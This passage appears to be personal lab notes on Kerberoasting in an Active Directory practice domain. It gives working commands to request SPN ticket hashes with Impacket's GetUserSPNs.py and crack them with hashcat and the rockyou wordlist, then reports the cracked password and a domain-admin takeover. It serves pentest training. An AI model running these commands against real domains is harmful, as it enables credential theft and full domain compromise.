Collect any SPN hashes:
```bash
sudo GetUserSPNs.py MARVEL.local/frank:Password1 -dc-ip 10.0.0.18 -request
```

Results:
![[Pasted image 20240321162849.png]]

## Cracking the hash with hashcat

Store the above collected hash in a file named *sql_service_hash.txt*. Use *hashcat* to crack it:
```bash
hashcat -m 13100 sql_service_hash.txt /usr/share/wordlists/rockyou.txt
```
=> hashcat was able to crack the password: **MYpassword123#**

In our case we now have the password for this domain-admin account and would be able to take over the domain! 